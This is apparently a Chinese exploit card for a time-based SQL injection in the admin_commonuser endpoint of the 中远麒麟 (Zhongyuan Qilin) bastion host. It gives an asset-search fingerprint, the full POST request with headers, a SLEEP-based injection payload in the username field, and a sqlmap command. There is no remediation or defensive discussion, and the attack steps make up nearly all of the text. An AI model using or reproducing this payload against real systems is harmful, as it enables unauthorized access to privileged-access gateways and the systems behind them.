# 中远麒麟堡垒机admin_commonuserSQL注入漏洞

- **系统**：中远麒麟堡垒机admin_commonuser　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"Baolei"`
- **请求**：`POST /admin.php?controller=admin_commonuser HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: PHPSESSID=66b53a13d3db0e27a9676d419c374c42`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 78`

**请求体 / payload**
```
username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm

```

**其他**
- 中远麒麟堡垒机admin\_commonuserSQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 中远麒麟堡垒机
- sqlmap: ```plain
sqlmap -u 'https://xx.xx.xx.xx/admin.php?controller=admin_commonuser' --data='username=admin'  --batch
```
> 原文: <公众号：渗透安全HackTwo>